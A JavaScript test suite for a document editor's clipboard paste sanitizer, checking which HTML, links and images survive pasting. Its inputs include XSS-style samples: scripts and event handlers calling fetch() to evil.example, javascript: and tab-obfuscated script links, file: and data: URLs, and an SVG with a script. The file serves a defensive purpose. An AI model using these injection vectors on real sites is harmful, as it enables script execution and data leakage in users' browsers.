import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import test from 'node:test';
import { parseHTML } from 'linkedom';
import { IMAGE_MAX_BYTES, checkDocument } from '../../../dist/shared/schema/index.js';
import {
  SVG_MARKUP,
  animatedWebp,
  gifFrames,
  jpegHeader,
  pngHeader,
  stillWebp,
} from '../../../scripts/make-hostile-fixtures/images.mjs';
import { loadRenderer } from '../editor/load-renderer.mjs';

const clipboardUrl = new URL('../../../src/renderer/clipboard/index.ts', import.meta.url);

function parseHtml(html) {
  // DOMParser puts a fragment in body. linkedom only does that for a full document.
  const source = /<html[\s>]/i.test(html)
    ? html
    : `<!doctype html><html><body>${html}</body></html>`;
  return parseHTML(source).document;
}

function ids() {
  let next = 1;
  return () => {
    const id = `00000000-0000-4000-8000-${String(next).padStart(12, '0')}`;
    next += 1;
    return id;
  };
}

async function api() {
  return loadRenderer(clipboardUrl);
}

async function paste(input) {
  const { sanitizePaste } = await api();
  return sanitizePaste(input, { ids: ids(), parseHtml });
}

function shell(blocks) {
  return {
    view: 'pageless',
    page: {
      paper: 'letter',
      orientation: 'portrait',
      margins: { top: 1, right: 1, bottom: 1, left: 1 },
    },
    header: {
      id: '00000000-0000-4000-8000-0000000000aa',
      align: 'left',
      lineSpacing: 'single',
      spaceBefore: 0,
      spaceAfter: 0,
      indents: { left: 0, first: 0, hanging: 0 },
      content: [],
    },
    footer: {
      id: '00000000-0000-4000-8000-0000000000bb',
      align: 'left',
      lineSpacing: 'single',
      spaceBefore: 0,
      spaceAfter: 0,
      indents: { left: 0, first: 0, hanging: 0 },
      content: [],
    },
    blocks,
  };
}

function assertSchema(blocks) {
  const result = checkDocument(shell(blocks));
  assert.equal(result.ok, true, result.ok ? '' : `${result.path} ${result.message}`);
}

function textOf(blocks) {
  return JSON.stringify(blocks);
}

function sha256(bytes) {
  return createHash('sha256').update(bytes).digest('hex');
}

test('a web page keeps text, a table, and supported marks, and drops the remote image', async () => {
  const result = await paste({
    html: `
      <h2>Notes</h2>
      <p>Hello <strong>class</strong></p>
      <table>
        <tr><th>A</th><th>B</th></tr>
        <tr><td>1</td><td width="200" style="background:red">2</td></tr>
      </table>
      <img src="https://evil.example/pixel.png" alt="pixel">
    `,
  });
  assert.equal(result.images.length, 0);
  assert.deepEqual(result.blocks.map((block) => block.type), ['heading', 'paragraph', 'table']);
  assert.equal(result.blocks[0].level, 2);
  assert.deepEqual(result.blocks[0].content, [{ type: 'text', text: 'Notes' }]);
  assert.deepEqual(result.blocks[1].content, [
    { type: 'text', text: 'Hello ' },
    { type: 'text', text: 'class', marks: { bold: true } },
  ]);
  assert.equal(result.blocks[2].headerRow, true);
  assert.deepEqual(result.blocks[2].columnWidths, [3.25, 3.25]);
  assert.equal(result.blocks[2].rows[0].cells[0].content[0].text, 'A');
  assert.equal(result.blocks[2].rows[1].cells[1].content[0].text, '2');
  assert.equal(textOf(result.blocks).includes('evil.example'), false);
  assert.equal(textOf(result.blocks).includes('background'), false);
  assertSchema(result.blocks);
});

test('scripts, styles, event handlers, remote images, and iframes are dropped', async () => {
  const calls = [];
  const originalFetch = globalThis.fetch;
  globalThis.fetch = (url) => {
    calls.push(String(url));
    throw new Error('network');
  };
  try {
    const result = await paste({
      html: `
        <p>Before<script>fetch('https://evil.example/s')</script>After</p>
        <iframe src="https://evil.example/frame">fallback</iframe>
        <img src="https://evil.example/a.png" onerror="fetch('https://evil.example/e')">
        <style>@import url('https://evil.example/s.css');</style>
        <div onclick="fetch('https://evil.example/c')" style="color:red" class="x">Click</div>
        <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><text>Icon</text></svg>
      `,
    });
    assert.deepEqual(calls, []);
    assert.deepEqual(result.blocks.map((block) => block.content?.[0]?.text ?? block.text), ['BeforeAfter', 'Click']);
    const json = textOf(result);
    for (const needle of ['evil.example', 'onclick', 'onerror', 'javascript:', '<script', 'iframe', 'Icon']) {
      assert.equal(json.includes(needle), false, needle);
    }
    assertSchema(result.blocks);
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test('javascript, file, and data links are dropped and their text is kept', async () => {
  const { allowedLinkAddress } = await api();
  assert.equal(allowedLinkAddress('javascript:alert(1)'), null);
  assert.equal(allowedLinkAddress('JAVASCRIPT:alert(1)'), null);
  assert.equal(allowedLinkAddress('java\tscript:alert(1)'), null);
  assert.equal(allowedLinkAddress('file:///C:/secret.txt'), null);
  assert.equal(allowedLinkAddress('data:text/html,hi'), null);
  assert.equal(allowedLinkAddress('obelisk://open'), null);
  assert.equal(allowedLinkAddress('\\\\server\\share'), null);
  assert.equal(allowedLinkAddress('//cdn.example/a'), null);
  assert.equal(allowedLinkAddress('page.html'), null);
  assert.equal(allowedLinkAddress('https://example.com/docs'), 'https://example.com/docs');
  assert.equal(allowedLinkAddress('mailto:student@school.edu'), 'mailto:student@school.edu');

  const result = await paste({
    html: `
      <p>
        <a href="javascript:alert(1)"><b>Click</b></a>
        <a href="file:///C:/secret.txt">secret</a>
        <a href="data:text/html,hi">blob</a>
        <a href="java&#9;script:alert(1)">tab</a>
        <a href="page.html">page</a>
        <a href="mailto:student@school.edu">mail</a>
        <a href="https://example.com/docs">docs</a>
      </p>
    `,
  });
  assert.equal(result.blocks.length, 1);
  const content = result.blocks[0].content;
  assert.deepEqual(content.find((part) => part.text === 'Click'), {
    type: 'text',
    text: 'Click',
    marks: { bold: true },
  });
  for (const word of ['secret', 'blob', 'tab', 'page']) {
    assert.equal(content.some((part) => part.type === 'text' && part.text.includes(word)), true, word);
    assert.equal(content.some((part) => part.type === 'link' && part.text.includes(word)), false, word);
  }
  assert.deepEqual(content.find((part) => part.text === 'mail'), {
    type: 'link',
    address: 'mailto:student@school.edu',
    text: 'mail',
  });
  assert.deepEqual(content.find((part) => part.text === 'docs'), {
    type: 'link',
    address: 'https://example.com/docs',
    text: 'docs',
  });
  const json = textOf(result.blocks);
  assert.equal(json.includes('javascript:'), false);
  assert.equal(json.includes('file:'), false);
  assert.equal(json.includes('data:'), false);
  assertSchema(result.blocks);
});

test('an overlong link is dropped and http without a host is dropped', async () => {
  const { allowedLinkAddress } = await api();
  const long = `https://example.com/${'a'.repeat(2100)}`;
  assert.equal(allowedLinkAddress(long), null);
  assert.equal(allowedLinkAddress('http://'), null);
  assert.equal(allowedLinkAddress('mailto:'), null);
  const result = await paste({
    html: `<p><a href="${long}">long</a> <a href="https://example.com">ok</a></p>`,
  });
  assert.equal(result.blocks[0].content.some((part) => part.type === 'link' && part.text.includes('long')), false);
  assert.equal(result.blocks[0].content.some((part) => part.type === 'text' && part.text.includes('long')), true);
  assert.equal(result.blocks[0].content.some((part) => part.address === 'https://example.com/'), true);
});

test('supported formatting is kept and fonts, colors, and sizes are not', async () => {
  const result = await paste({
    html: `
      <h1>Title</h1>
      <p>A <b>bold</b> <em>italic</em> <u>under</u> <s>strike</s> <span style="text-decoration:underline">nope</span></p>
      <p class="x" style="color:#ff0000;font-family:Arial;font-size:48px">Styled <font color="#ff0000" face="Arial">text</font> <sup>2</sup></p>
      <ul><li>A<ul><li>B</li></ul></li><li>C</li></ul>
      <ul><li>A<ol><li>B</li></ol></li><li>C</li></ul>
      <ol><li>One</li></ol>
      <ul>
        <li><input type="checkbox" checked> Done</li>
        <li><input type="checkbox"> Todo</li>
      </ul>
      <pre><code>const a = 1;\n</code></pre>
      <blockquote><p>Quoted</p><p>More <b>bit</b></p></blockquote>
      <hr>
    `,
  });
  const types = result.blocks.map((block) => block.type === 'list' ? `${block.type}:${block.style}` : block.type);
  assert.deepEqual(types, [
    'heading',
    'paragraph',
    'paragraph',
    'list:bulleted',
    'list:bulleted',
    'list:numbered',
    'list:bulleted',
    'list:numbered',
    'list:checklist',
    'code',
    'quote',
    'divider',
  ]);
  assert.deepEqual(result.blocks[1].content, [
    { type: 'text', text: 'A ' },
    { type: 'text', text: 'bold', marks: { bold: true } },
    { type: 'text', text: ' ' },
    { type: 'text', text: 'italic', marks: { italic: true } },
    { type: 'text', text: ' ' },
    { type: 'text', text: 'under', marks: { underline: true } },
    { type: 'text', text: ' ' },
    { type: 'text', text: 'strike', marks: { strike: true } },
    { type: 'text', text: ' nope' },
  ]);
  assert.deepEqual(result.blocks[2].content, [{ type: 'text', text: 'Styled text 2' }]);
  assert.deepEqual(result.blocks[3].items.map((item) => [item.level, item.content[0].text]), [
    [0, 'A'],
    [1, 'B'],
    [0, 'C'],
  ]);
  assert.equal(result.blocks[4].items[0].content[0].text, 'A');
  assert.equal(result.blocks[5].style, 'numbered');
  assert.equal(result.blocks[5].items[0].level, 1);
  assert.equal(result.blocks[5].items[0].content[0].text, 'B');
  assert.equal(result.blocks[6].items[0].content[0].text, 'C');
  assert.deepEqual(result.blocks[8].items.map((item) => [item.checked, item.content[0].text]), [
    [true, 'Done'],
    [false, 'Todo'],
  ]);
  assert.equal(result.blocks[9].text, 'const a = 1;');
  assert.deepEqual(result.blocks[10].content, [
    { type: 'text', text: 'Quoted\nMore ' },
    { type: 'text', text: 'bit', marks: { bold: true } },
  ]);
  assertSchema(result.blocks);
});

test('merged table cells are split and widths are not kept', async () => {
  const result = await paste({
    html: `
      <table style="width:500px" border="1">
        <tr><td colspan="2" bgcolor="#ff0000">Wide</td></tr>
        <tr><td rowspan="2">Tall</td><td>R</td></tr>
        <tr><td>S</td></tr>
      </table>
    `,
  });
  assert.equal(result.blocks.length, 1);
  const table = result.blocks[0];
  assert.equal(table.headerRow, false);
  assert.deepEqual(table.columnWidths, [3.25, 3.25]);
  const rows = table.rows.map((row) => row.cells.map((cell) => cell.content[0]?.text ?? ''));
  assert.deepEqual(rows, [
    ['Wide', ''],
    ['Tall', 'R'],
    ['', 'S'],
  ]);
  assert.equal(textOf(table).includes('bgcolor'), false);
  assert.equal(textOf(table).includes('500'), false);
  assertSchema(result.blocks);
});

test('svg markup and svg image bytes are dropped', async () => {
  const svgBytes = new TextEncoder().encode(SVG_MARKUP);
  const fromHtml = await paste({
    html: `${SVG_MARKUP}<p>Keep</p><img src="data:image/svg+xml;base64,${Buffer.from(SVG_MARKUP).toString('base64')}">`,
  });
  assert.deepEqual(fromHtml.blocks.map((block) => block.type), ['paragraph']);
  assert.equal(fromHtml.blocks[0].content[0].text, 'Keep');
  assert.equal(fromHtml.images.length, 0);

  const fromBytes = await paste({ image: svgBytes, alt: 'icon' });
  assert.deepEqual(fromBytes.blocks, []);
  assert.deepEqual(fromBytes.images, []);
});

test('clipboard image data is kept inside the image limits', async () => {
  const png = pngHeader(8, 8);
  const result = await paste({
    html: `<p>Hi</p><img alt="Dot" src="data:image/png;base64,${png.toString('base64')}">`,
    image: jpegHeader(10, 12),
    alt: 'Photo',
  });
  assert.deepEqual(result.blocks.map((block) => block.type), ['paragraph', 'image', 'image']);
  assert.equal(result.images.length, 2);
  const embedded = result.images.find((image) => image.type === 'png');
  const photo = result.images.find((image) => image.type === 'jpeg');
  assert.equal(embedded.sha256, sha256(png));
  assert.equal(embedded.pixelWidth, 8);
  assert.equal(embedded.frames, 1);
  assert.equal(result.blocks[1].sha256, embedded.sha256);
  assert.equal(result.blocks[1].alt, 'Dot');
  assert.equal(result.blocks[1].width, 0.083);
  assert.equal(photo.pixelWidth, 10);
  assert.equal(photo.pixelHeight, 12);
  assert.equal(result.blocks[2].alt, 'Photo');
  assert.equal(result.blocks[2].rotation, 0);
  assertSchema(result.blocks);

  const still = await paste({ image: stillWebp(4, 4) });
  assert.equal(still.images[0].type, 'webp');
  assert.equal(still.images[0].frames, 1);

  const gif = await paste({ image: gifFrames(2, 2, [{ x: 0, y: 0, width: 2, height: 2 }]) });
  assert.equal(gif.images[0].type, 'gif');
  assert.equal(gif.images[0].frames, 1);
  assertSchema(gif.blocks);
});

test('oversized, over-framed, and unknown images are dropped', async () => {
  const huge = pngHeader(8001, 2);
  const edge = pngHeader(8000, 2);
  const manyFrames = gifFrames(1, 1, Array.from({ length: 1001 }, () => ({
    x: 0, y: 0, width: 1, height: 1,
  })));
  const wideWebp = animatedWebp(2, 8001, 2);
  const tooLong = new Uint8Array(IMAGE_MAX_BYTES + 1);
  tooLong.set(pngHeader(1, 1));

  for (const bytes of [huge, manyFrames, wideWebp, tooLong, new Uint8Array([1, 2, 3, 4])]) {
    const result = await paste({ image: bytes });
    assert.deepEqual(result.blocks, []);
    assert.deepEqual(result.images, []);
  }

  const kept = await paste({ image: edge });
  assert.equal(kept.blocks.length, 1);
  assert.equal(kept.images[0].pixelWidth, 8000);
  assert.equal(kept.blocks[0].width, 6.5);
  assertSchema(kept.blocks);
});

test('plain text keeps lines and drops everything else', async () => {
  const plain = await paste({ text: 'Hello\n\nWorld\n', plain: true, html: '<p><b>Nope</b></p>' });
  assert.equal(plain.blocks.length, 3);
  assert.deepEqual(plain.blocks.map((block) => block.content[0]?.text ?? ''), ['Hello', '', 'World']);
  assert.equal(plain.blocks.every((block) => block.type === 'paragraph'), true);
  assert.equal(plain.images.length, 0);

  const fallback = await paste({ text: 'Only text' });
  assert.equal(fallback.blocks[0].content[0].text, 'Only text');

  const scriptOnly = await paste({ html: '<script>alert(1)</script>', text: 'alert(1)' });
  assert.deepEqual(scriptOnly.blocks, []);

  const cleaned = await paste({ text: 'A\u0000B\uD800C' });
  assert.equal(cleaned.blocks[0].content[0].text, 'ABC');
  assertSchema(plain.blocks);
  assertSchema(cleaned.blocks);
});
